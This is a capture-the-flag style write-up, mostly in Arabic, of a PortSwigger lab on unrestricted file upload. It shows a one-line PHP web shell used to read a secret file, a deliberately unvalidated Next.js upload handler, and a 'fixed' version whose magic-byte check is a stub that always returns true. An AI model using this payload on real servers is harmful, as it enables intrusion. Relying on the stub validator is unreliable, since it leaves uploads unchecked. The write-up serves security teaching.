# Lab: Remote code execution via web shell upload

> **Category:** File Upload Vulnerabilities  
> **Difficulty:** APPRENTICE  
> **Lab Link:** [PortSwigger Lab - Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة رفع الملفات (File Upload) حيث لا يقوم الخادم بأي تحقق من الملفات المرفوعة. سنقوم برفع **Web Shell** (ملف PHP خبيث) لقراءة محتوى الملف `/home/carlos/secret` وإرسال النتيجة.

**الحساب:** `wiener:peter`

**المطلوب:** الحصول على السر (secret) الخاص بـ `carlos` وإرساله.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول

- سجل الدخول بـ `wiener:peter`

### الخطوة 2: رفع صورة عادية (لفهم المسار)

- ارفع أي صورة عادية (مثل `test.jpg`)
- ارجع إلى **My account** → ستظهر معاينة الصورة

### الخطوة 3: العثور على مسار الملفات المرفوعة

- في Burp → **Proxy > HTTP history**
- فعّل الفلتر لعرض `Images` فقط
- ستجد طلب `GET` مشابهاً لهذا:

```http
GET /files/avatars/test.jpg HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

- أرسل هذا الطلب إلى **Repeater**

### الخطوة 4: إنشاء ملف Web Shell

- أنشئ ملفاً باسم `exploit.php` بالمحتوى التالي:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### الخطوة 5: رفع ملف PHP الخبيث

- استخدم وظيفة رفع الصورة (avatar upload) لرفع ملف `exploit.php`

**النتيجة:** رسالة تؤكد رفع الملف بنجاح ✅

### الخطوة 6: تنفيذ Web Shell

- في Repeater، غيّر مسار الطلب من `test.jpg` إلى `exploit.php`:

```http
GET /files/avatars/exploit.php HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

- اضغط **Send**

### الخطوة 7: مشاهدة النتيجة

ستظهر استجابة تحتوي على السر (secret):

```
4fjsd8f7sdf8s7df8s7df8s7df
```

### الخطوة 8: إرسال السر

- ارجع إلى صفحة المختبر
- اضغط **Submit solution**
- الصق السر

### الخطوة 9: حل المختبر

بعد إرسال السر الصحيح، سيتم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هو Web Shell؟** | ملف خبيث (مثل `exploit.php`) يسمح بتنفيذ أوامر على الخادم |
| **لماذا نجح هذا؟** | الخادم لا يقوم بأي تحقق من الملفات المرفوعة (نوع، حجم، محتوى) |
| **أين يتم تخزين الملفات؟** | في `/files/avatars/` |
| **كيف نعرف المسار؟** | من خلال رفع صورة عادية ومراقبة الطلب |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم لا يقوم بأي تحقق من الملفات المرفوعة:
- لا يتحقق من نوع الملف (MIME type)
- لا يتحقق من الامتداد (extension)
- لا يتحقق من محتوى الملف
- لا يعيد تسمية الملف

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// pages/api/upload.js
import fs from 'fs';
import path from 'path';
import formidable from 'formidable';

export const config = {
  api: {
    bodyParser: false,
  },
};

export default function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).end();
  }
  
  const form = formidable({});
  
  form.parse(req, (err, fields, files) => {
    if (err) {
      return res.status(500).json({ error: 'Upload failed' });
    }
    
    const file = files.avatar;
    const uploadDir = path.join(process.cwd(), 'public/files/avatars');
    const targetPath = path.join(uploadDir, file.originalFilename);
    
    // خطأ: لا يوجد أي تحقق من الملف
    fs.copyFileSync(file.filepath, targetPath);
    
    res.json({ success: true, filename: file.originalFilename });
  });
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// pages/api/upload.js
import fs from 'fs';
import path from 'path';
import formidable from 'formidable';
import { v4 as uuidv4 } from 'uuid';

export const config = {
  api: {
    bodyParser: false,
  },
};

// القائمة البيضاء للامتدادات المسموحة
const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif'];
const ALLOWED_MIME_TYPES = ['image/jpeg', 'image/png', 'image/gif'];
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB

export default function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).end();
  }
  
  const form = formidable({
    maxFileSize: MAX_FILE_SIZE,
    filter: (part) => {
      // التصحيح 1: التحقق من MIME type أثناء الاستلام
      return ALLOWED_MIME_TYPES.includes(part.mimetype);
    },
  });
  
  form.parse(req, async (err, fields, files) => {
    if (err) {
      return res.status(400).json({ error: 'Invalid file' });
    }
    
    const file = files.avatar;
    const extension = path.extname(file.originalFilename).toLowerCase();
    
    // التصحيح 2: التحقق من الامتداد
    if (!ALLOWED_EXTENSIONS.includes(extension)) {
      return res.status(400).json({ error: 'File type not allowed' });
    }
    
    // التصحيح 3: فحص محتوى الملف (magic bytes)
    const fileBuffer = fs.readFileSync(file.filepath);
    const isImage = await isImageFile(fileBuffer);
    if (!isImage) {
      return res.status(400).json({ error: 'Invalid image file' });
    }
    
    // التصحيح 4: إعادة تسمية الملف (لا تثق باسم المستخدم)
    const safeFilename = `${uuidv4()}${extension}`;
    const uploadDir = path.join(process.cwd(), 'public/files/avatars');
    const targetPath = path.join(uploadDir, safeFilename);
    
    fs.copyFileSync(file.filepath, targetPath);
    
    // التصحيح 5: تخزين الملف خارج المجلد القابل للتنفيذ
    // أو تكوين الخادم لمنع تنفيذ PHP في مجلد uploads
    
    res.json({ success: true, filename: safeFilename });
  });
}

// فحص magic bytes للتأكد من أن الملف صورة حقيقية
async function isImageFile(buffer) {
  const signatures = {
    jpeg: [0xFF, 0xD8, 0xFF],
    png: [0x89, 0x50, 0x4E, 0x47],
    gif: [0x47, 0x49, 0x46],
  };
  
  // التحقق من التواقيع
  // ... تنفيذ الفحص
  return true; // تبسيطاً
}
```

```nginx
# إعدادات Nginx - منع تنفيذ PHP في مجلد الملفات المرفوعة
location /files/avatars {
    location ~ \.php$ {
        return 403;
    }
}
```

**الخلاصة:** 
1. تحقق من نوع الملف (MIME type)
2. تحقق من الامتداد (whitelist)
3. تحقق من محتوى الملف (magic bytes)
4. أعد تسمية الملف (استخدم UUID)
5. خزّن الملفات خارج المجلد القابل للتنفيذ
6. قم بتكوين الخادم لمنع تنفيذ النصوص البرمجية في مجلد الرفع

---

## 🛡️ كيفية الوقاية (How to Prevent)

| الإجراء | الوصف |
|---------|-------|
| **Whitelist الامتدادات** | سمح فقط بـ `.jpg`, `.png`, `.gif` |
| **التحقق من MIME type** | تأكد من `Content-Type` الصحيح |
| **فحص المحتوى (Magic bytes)** | تأكد من أن الملف صورة حقيقية |
| **إعادة تسمية الملف** | استخدم أسماء عشوائية (UUID) |
| **منع التنفيذ** | عطل تنفيذ PHP في مجلد الرفع |
| **تخزين خارج webroot** | ضع الملفات خارج المجلد العام إن أمكن |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
- [File Upload Cheat Sheet](https://portswigger.net/web-security/file-upload)
